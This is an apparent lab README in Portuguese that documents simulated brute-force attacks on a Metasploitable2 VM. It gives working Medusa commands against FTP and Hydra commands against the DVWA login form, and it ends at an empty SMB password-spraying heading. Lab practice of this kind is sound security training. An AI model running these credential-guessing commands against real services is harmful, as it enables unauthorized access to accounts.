# Brute_Force_in_Metasploitable2
Documentação de testes de força bruta utilizando Medusa e Hydra em um ambiente controlado Metasploitable2.

## Objetivo
Executar ataques simulados: força bruta em FTP, automação de tentativas de login em formulário web (DVWA) e password spraying em SMB com enumeração de usuários.

## Recursos utilizados 
- VM PfSense 192.168.1.1
- VM Kali Linux 192.168.1.100
- VM Metasploitable2 192.168.1.106
- images/ : 
- logs/ :
- wordlists/ : Contém as wordlists de senhas e usuários utilizados na simulação

## Brute Force em FTP

```
medusa -h 192.168.1.106 -U users.txt -P pass.txt -M ftp
```

## Formulário web DVWA

```
hydra -L users.txt -P pass.txt 192.168.1.106 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
```

## Password Spraying em SMB